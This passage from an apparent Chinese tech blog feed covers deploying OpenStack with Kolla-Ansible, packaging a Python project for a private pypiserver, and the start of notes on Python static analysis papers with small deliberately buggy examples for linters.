class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bootstrap</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ bootstrap-servers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ prechecks</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取镜像</span></span><br><span class="line"><span class="comment"># kolla-ansible -i ~/multinode --configdir ~ pull</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ deploy</span><br><span class="line"><span class="comment"># kolla-ansible -i ~/multinode --configdir ~ reconfigure</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署失败</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ destroy --yes-i-really-really-mean-it</span><br></pre></td></tr></table></figure><h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>在部署节点上执行以下指令，生成身份认证文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 OpenStack CLI 客户端</span></span><br><span class="line">pip install python-openstackclient</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成认证文件</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ post-deploy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 身份认证</span></span><br><span class="line">. ~/admin-openrc.sh</span><br></pre></td></tr></table></figure><p>使用 Kolla-Ansible 自带的脚本测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行脚本生成示例网络、镜像、实例等</span></span><br><span class="line">~/code/share/kolla-ansible/init-runonce</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建实例</span></span><br><span class="line">openstack server create \</span><br><span class="line">    --image cirros \</span><br><span class="line">    --flavor m1.tiny \</span><br><span class="line">    --key-name mykey \</span><br><span class="line">    --network demo-net \</span><br><span class="line">    demo1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认实例状态</span></span><br><span class="line">openstack server list</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/08/31/RYBPvwHzVpFrm84.jpg" width="80%"><p>直接访问 <a href="http://10.111.1.250/">http://10.111.1.250</a> 可以看到刚才创建的实例所占用的资源</p><ul><li>用户名密码查看 admin-openrc.sh 文件即可</li></ul><p><img src="https://i.loli.net/2021/08/31/QFzHXR43DqjsdwO.png"></p><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://github.com/Joxit/docker-registry-ui">Joxit/docker-registry-ui</a></li><li><a href="https://www.cnblogs.com/huangxincheng/p/11131623.html">8天入门docker系列 —— 第六天 搭建自己的私有镜像仓库Registry</a></li><li><a href="https://docs.docker.com/registry/configuration/">Configuring a registry</a></li><li><a href="https://docs.openstack.org/kolla/latest/admin/image-building.html">Building Container Images</a></li><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/quickstart.html">Kolla-Ansible - Quick Start</a></li><li><a href="https://docs.openstack.org/kolla/latest/contributor/genconfig.html">Generating kolla-build.conf</a></li><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/security.html">Kolla Security</a></li><li><a href="https://timonweb.com/devops/how-to-enable-passwordless-sudo-for-a-specific-user-in-linux/">How To Enable Passwordless Sudo For A Specific User in Linux</a></li><li><a href="https://blog.csdn.net/qq_28513801/article/details/116035363">使用kolla-ansible部署多节点OpenStack(T版)及对接Ceph</a></li></ul>]]></content>
    
    
    <summary type="html">使用 Kolla-Ansible 的 multinode 配置远程部署 OpenStack (Victoria)</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Python 项目打包并发布到私有 PyPI 服务器</title>
    <link href="https://jckling.github.io/2021/08/23/Other/Python%20%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0%E7%A7%81%E6%9C%89%20PyPI%20%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://jckling.github.io/2021/08/23/Other/Python%20%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0%E7%A7%81%E6%9C%89%20PyPI%20%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2021-08-23T03:01:14.000Z</published>
    <updated>2021-11-23T14:04:58.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>提了一个新需求，要把开发的 Python 项目发布到 PyPI 上，但因为需要保密，所以得自己搭建一个内部的 PyPI 服务器😓</p><h1 id="Python-项目打包"><a href="#Python-项目打包" class="headerlink" title="Python 项目打包"></a>Python 项目打包</h1><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p>首先创建一个待发布的文件夹 <code>packaging</code>，整理一下项目结构并添加几个必要的文件（<code>LICENSE</code>、<code>README.md</code>、<code>setup.py</code>）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">packaging</span><br><span class="line">├── my_project</span><br><span class="line">│   ├── module1</span><br><span class="line">│   │   ├── __init__.py</span><br><span class="line">│   │   └── hello.py</span><br><span class="line">│   ├── module2</span><br><span class="line">│   │   ├── __init__.py</span><br><span class="line">│   │   └── bye.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   └── utils.py</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README.md</span><br><span class="line">└── setup.py  <span class="comment"># 或 setup.cfg</span></span><br></pre></td></tr></table></figure><p>示例工程很简单，所有 <code>__init__.py</code> 都是空文件，其他文件内容如下：</p><ol><li><p>hello.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    print(<span class="string">&quot;hello world!&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>bye.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goodbye</span>():</span></span><br><span class="line">    print(<span class="string">&quot;goodbye!&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>utils.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&quot;A demo project for packaging.&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="选择许可证"><a href="#选择许可证" class="headerlink" title="选择许可证"></a>选择许可证</h2><p>PyPI 要求所有上传的包都必须包含一个许可证，利用 <a href="https://choosealicense.com/">https://choosealicense.com/</a> 帮助选择许可证，然后将许可证内容复制到 <code>LICENSE</code> 文件中。</p><p><em>注意有些许可证需要填入年份（<code>[year]</code>）和所有者（<code>[fullname]</code> 或 <code>[name of copyright owner]</code>）</em></p><p>例如，MIT 许可证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">MIT License</span><br><span class="line"></span><br><span class="line">Copyright (c) [2021] [my_project]</span><br><span class="line"></span><br><span class="line">Permission is hereby granted, free of charge, to any person obtaining a copy</span><br><span class="line">of this software and associated documentation files (the &quot;Software&quot;), to deal</span><br><span class="line">in the Software without restriction, including without limitation the rights</span><br><span class="line">to use, copy, modify, merge, publish, distribute, sublicense, and&#x2F;or sell</span><br><span class="line">copies of the Software, and to permit persons to whom the Software is</span><br><span class="line">furnished to do so, subject to the following conditions:</span><br><span class="line"></span><br><span class="line">The above copyright notice and this permission notice shall be included in all</span><br><span class="line">copies or substantial portions of the Software.</span><br><span class="line"></span><br><span class="line">THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span><br><span class="line">IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span><br><span class="line">FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span><br><span class="line">AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span><br><span class="line">LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,</span><br><span class="line">OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE</span><br><span class="line">SOFTWARE.</span><br></pre></td></tr></table></figure><h2 id="编写说明"><a href="#编写说明" class="headerlink" title="编写说明"></a>编写说明</h2><p>根据 markdown 语法编写项目的详细说明，之后可以作为 <code>setup.py</code> 中的 <code>long_description</code> 项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Example Package</span><br><span class="line"></span><br><span class="line">This is a simple example package. You can use</span><br><span class="line">[Github-flavored Markdown](https:&#x2F;&#x2F;guides.github.com&#x2F;features&#x2F;mastering-markdown&#x2F;)</span><br><span class="line">to write your content.</span><br></pre></td></tr></table></figure><h2 id="配置元数据"><a href="#配置元数据" class="headerlink" title="配置元数据"></a>配置元数据</h2><p>有两种元数据类型：静态元数据（<code>setup.cfg</code>）和动态元数据（<code>setup.py</code>），官方推荐首选静态元数据。</p><h3 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h3><p>下面是官方示例的 <code>setup.cfg</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[metadata]</span><br><span class="line">name &#x3D; example-pkg-YOUR-USERNAME-HERE</span><br><span class="line">version &#x3D; 0.0.1</span><br><span class="line">author &#x3D; Example Author</span><br><span class="line">author_email &#x3D; author@example.com</span><br><span class="line">description &#x3D; A small example package</span><br><span class="line">long_description &#x3D; file: README.md</span><br><span class="line">long_description_content_type &#x3D; text&#x2F;markdown</span><br><span class="line">url &#x3D; https:&#x2F;&#x2F;github.com&#x2F;pypa&#x2F;sampleproject</span><br><span class="line">project_urls &#x3D;</span><br><span class="line">    Bug Tracker &#x3D; https:&#x2F;&#x2F;github.com&#x2F;pypa&#x2F;sampleproject&#x2F;issues</span><br><span class="line">classifiers &#x3D;</span><br><span class="line">    Programming Language :: Python :: 3</span><br><span class="line">    License :: OSI Approved :: MIT License</span><br><span class="line">    Operating System :: OS Independent</span><br><span class="line"></span><br><span class="line">[options]</span><br><span class="line">package_dir &#x3D;</span><br><span class="line">    &#x3D; src</span><br><span class="line">packages &#x3D; find:</span><br><span class="line">python_requires &#x3D; &gt;&#x3D;3.6</span><br><span class="line"></span><br><span class="line">[options.packages.find]</span><br><span class="line">where &#x3D; src</span><br></pre></td></tr></table></figure><table><thead><tr><th>字段名称</th><th>说明</th></tr></thead><tbody><tr><td><code>name</code></td><td>如果要发布在 pypi.org 上，名称必须是唯一的，只能由英文字母、<code>_</code>、<code>-</code> 组成</td></tr><tr><td><code>author</code>、<code>author_email</code></td><td>标识作者</td></tr><tr><td><code>description</code></td><td>包的简短介绍</td></tr><tr><td><code>long_description</code></td><td>包的详细介绍，可以指定说明文件</td></tr><tr><td><code>url</code></td><td>项目主页</td></tr><tr><td><code>project_urls</code></td><td>和项目相关的额外链接</td></tr><tr><td><code>classifiers</code></td><td>附加元数据，例如许可证、兼容。完整列表见 <a href="https://pypi.org/classifiers/">https://pypi.org/classifiers/</a></td></tr></tbody></table><h3 id="动态"><a href="#动态" class="headerlink" title="动态"></a>动态</h3><p>官方示例的 <code>setup.py</code>，可以看出字段基本是相同的，也可以利用现成的模板进行编写：<a href="https://github.com/kennethreitz/setup.py/blob/master/setup.py">kennethreitz/setup.py</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setuptools</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;README.md&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">    long_description = fh.read()</span><br><span class="line"></span><br><span class="line">setuptools.setup(</span><br><span class="line">    name=<span class="string">&quot;example-pkg-YOUR-USERNAME-HERE&quot;</span>,</span><br><span class="line">    version=<span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">    author=<span class="string">&quot;Example Author&quot;</span>,</span><br><span class="line">    author_email=<span class="string">&quot;author@example.com&quot;</span>,</span><br><span class="line">    description=<span class="string">&quot;A small example package&quot;</span>,</span><br><span class="line">    long_description=long_description,</span><br><span class="line">    long_description_content_type=<span class="string">&quot;text/markdown&quot;</span>,</span><br><span class="line">    url=<span class="string">&quot;https://github.com/pypa/sampleproject&quot;</span>,</span><br><span class="line">    project_urls=&#123;</span><br><span class="line">        <span class="string">&quot;Bug Tracker&quot;</span>: <span class="string">&quot;https://github.com/pypa/sampleproject/issues&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    classifiers=[</span><br><span class="line">        <span class="string">&quot;Programming Language :: Python :: 3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;License :: OSI Approved :: MIT License&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Operating System :: OS Independent&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    package_dir=&#123;<span class="string">&quot;&quot;</span>: <span class="string">&quot;src&quot;</span>&#125;,</span><br><span class="line">    packages=setuptools.find_packages(where=<span class="string">&quot;src&quot;</span>),</span><br><span class="line">    python_requires=<span class="string">&quot;&gt;=3.6&quot;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>实际上，可以把 <code>setup.cfg</code> 理解为包含 <code>setup.py</code> 命令默认选项的 ini 文件。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>Ubuntu 20.04 Server（Python 3.8.10）安装 <code>venv</code>，创建并使用虚拟环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 venv</span></span><br><span class="line">sudo apt install python3-venv -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建虚拟环境</span></span><br><span class="line">mkdir code</span><br><span class="line">python -m venv /home/jck/code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> /home/jck/code/bin/activate</span><br></pre></td></tr></table></figure><h2 id="生成包"><a href="#生成包" class="headerlink" title="生成包"></a>生成包</h2><p>使用以下 <code>setup.py</code> 配置文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setuptools</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;README.md&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">    long_description = fh.read()</span><br><span class="line"></span><br><span class="line">setuptools.setup(</span><br><span class="line">    name=<span class="string">&quot;my_project&quot;</span>,</span><br><span class="line">    version=<span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">    author=<span class="string">&quot;jckling&quot;</span>,</span><br><span class="line">    author_email=<span class="string">&quot;jckling@163.com&quot;</span>,</span><br><span class="line">    description=<span class="string">&quot;A small example package&quot;</span>,</span><br><span class="line">    long_description=long_description,</span><br><span class="line">    long_description_content_type=<span class="string">&quot;text/markdown&quot;</span>,</span><br><span class="line">    url=<span class="string">&quot;https://github.com/jckling&quot;</span>,</span><br><span class="line">    classifiers=[</span><br><span class="line">        <span class="string">&quot;Programming Language :: Python :: 3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;License :: OSI Approved :: MIT License&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Operating System :: OS Independent&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    packages=setuptools.find_packages(),</span><br><span class="line">    python_requires=<span class="string">&quot;&gt;=3.6&quot;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>安装 <code>setuptools</code> 和 <code>wheel</code>，支持从源码构建包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install setuptools</span><br><span class="line">pip install wheel</span><br></pre></td></tr></table></figure><p>进入 packaging 文件夹，检查 <code>setup.py</code>，如果有错误会打印提示信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python setup.py check</span><br><span class="line"><span class="comment"># running check</span></span><br></pre></td></tr></table></figure><p>打包，自动创建 <code>dist</code> 目录，以及相应的 <code>.tar.gz</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py sdist build</span><br></pre></td></tr></table></figure><script id="asciicast-Bhy00w92CAhOkpHz8o11aOpVL" src="https://asciinema.org/a/Bhy00w92CAhOkpHz8o11aOpVL.js" async></script><h1 id="本地-PyPI-服务器搭建"><a href="#本地-PyPI-服务器搭建" class="headerlink" title="本地 PyPI 服务器搭建"></a>本地 PyPI 服务器搭建</h1><h2 id="搭建服务器"><a href="#搭建服务器" class="headerlink" title="搭建服务器"></a>搭建服务器</h2><p>安装 <code>pypiserver</code>，创建文件夹 <code>packages</code> 用于放置发布的包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pypiserver</span><br><span class="line">mkdir ~/packages</span><br></pre></td></tr></table></figure><p>将 <code>my_project-0.0.1.tar.gz</code> 上传到 <code>~/packages</code> 目录下，在同一台虚拟机上操作直接使用 <code>mv</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv dist/my_project-0.0.1.tar.gz ~/packages</span><br></pre></td></tr></table></figure><p>运行服务器，端口指定为 <code>8080</code>， 默认监听所有 IP 地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypi-server -p 8080 ~/packages &amp;</span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>搜索本地服务器上是否有 <code>my_project</code> 包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip search --index http://localhost:8080 my_project</span><br></pre></td></tr></table></figure><p>安装和使用 <code>my_project</code> 包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --extra-index-url http://localhost:8080 my_project</span><br></pre></td></tr></table></figure><script id="asciicast-PTCdzI2ZPbmelUTBpgcS8kVHA" src="https://asciinema.org/a/PTCdzI2ZPbmelUTBpgcS8kVHA.js" async></script><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://pythonguidecn.readthedocs.io/zh/latest/writing/structure.html">结构化您的工程</a></li><li><a href="https://packaging.python.org/tutorials/packaging-projects/">Packaging Python Projects</a></li><li><a href="https://packaging.python.org/guides/distributing-packages-using-setuptools/">Packaging and distributing projects</a></li><li><a href="https://choosealicense.com/">Choose a License</a></li><li><a href="https://docs.python.org/zh-cn/3/library/index.html">Python 标准库</a></li><li><a href="https://testerhome.com/articles/27052">测试开发技术 实战教程：如何将自己的 Python 包发布到 PyPI 上</a></li><li><a href="https://github.com/kennethreitz/setup.py/blob/master/setup.py">kennethreitz/setup.py</a></li><li><a href="https://www.jianshu.com/p/c260b59cd3d0">基于 pypiserver 的 PyPI 私有仓库搭建实践</a></li><li><a href="https://github.com/pypiserver/pypiserver">pypiserver/pypiserver</a></li></ul>]]></content>
    
    
    <summary type="html">使用 pypiserver 搭建本地服务器</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python 静态分析相关论文</title>
    <link href="https://jckling.github.io/2021/07/28/Notes/Python%20%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87/"/>
    <id>https://jckling.github.io/2021/07/28/Notes/Python%20%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87/</id>
    <published>2021-07-28T11:01:13.000Z</published>
    <updated>2021-11-23T14:04:58.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>翻了几篇 Python 静态分析相关的论文，看看有什么比较好的分析工具。</p><h2 id="静态分析工具"><a href="#静态分析工具" class="headerlink" title="静态分析工具"></a>静态分析工具</h2><h3 id="1-Survey-on-Static-Analysis-Tools-of-Python-Programs"><a href="#1-Survey-on-Static-Analysis-Tools-of-Python-Programs" class="headerlink" title="1. Survey on Static Analysis Tools of Python Programs"></a>1. Survey on Static Analysis Tools of Python Programs</h3><blockquote><p>SQAMIA 2019</p></blockquote><p>概述了 Python 代码库静态分析的现有方法和工具，并介绍了一些新的研究方向。</p><p>总结了常见的 Python 静态分析工具之间的关系，简单介绍了（几行概述） <a href="https://github.com/PyCQA/pylint">Pylint</a>、<a href="https://github.com/PyCQA/pyflakes">Pyflakes</a>、<a href="https://github.com/PyCQA/flake8">flake8</a>、<a href="https://github.com/timothycrosley/deprecated.frosted">Frosted</a>、<a href="https://github.com/PyCQA/pycodestyle">Pycodestyle</a>、<a href="https://github.com/python/mypy">Mypy</a>、<a href="https://github.com/bjodah/pysym">PySym</a>、<a href="https://github.com/thomasjball/PyExZ3">PyExZ3</a>。</p><img src="https://i.loli.net/2021/07/29/qpvM1iYNFXhLgTe.jpg" style="zoom:70%;" /><p>设计并测试了 6 种典型的逻辑漏洞（logical errors），用 PyLint、Pyflakes、Flake8、Mypy、Frosted 检测</p><ul><li>使用默认配置</li><li>逻辑错误会产生意外的输出或结果，但不一定会导致崩溃</li></ul><img src="https://i.loli.net/2021/07/29/G1Q8ETPtCyKoSxA.png" style="zoom:70%;" /><ol><li><p>引用未定义变量</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">message = <span class="string">&quot;Hello there!&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;greetMe&quot;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">print(mesage) <span class="comment"># 变量名打错</span></span><br><span class="line">print(<span class="string">&quot;This code is fine, no problems.&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>太多位置参数</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys <span class="comment"># 未使用的导入</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, first_name, last_name, age</span>):</span></span><br><span class="line">        self.first_name = first_name</span><br><span class="line">        self.last_name = last_name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Windows&quot;</span> <span class="keyword">in</span> platform.platform(): <span class="comment"># 未定义的 platform 变量</span></span><br><span class="line">    print(<span class="string">&quot;You’ re using Windows !&quot;</span>)</span><br><span class="line"></span><br><span class="line">    self.age = self.getAge(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment"># 太多位置参数</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getAge</span>(<span class="params">this</span>):</span> <span class="comment"># 没有 self 参数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;18&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>传递类型错误的参数</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">x:<span class="built_in">int</span>, y:<span class="built_in">int</span></span>):</span> <span class="comment"># 类型注释</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line">print(<span class="built_in">sum</span>(<span class="number">3</span>, <span class="number">4</span>))</span><br><span class="line">print(<span class="built_in">sum</span>(<span class="number">3</span>, <span class="string">&quot;4&quot;</span>)) <span class="comment"># 传递错误类型的参数</span></span><br></pre></td></tr></table></figure></li><li><p>引用不存在的类属性</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">PERSON1 = Person(<span class="string">&quot;Hristina&quot;</span>, <span class="number">23</span>)</span><br><span class="line">print(PERSON1.age)</span><br><span 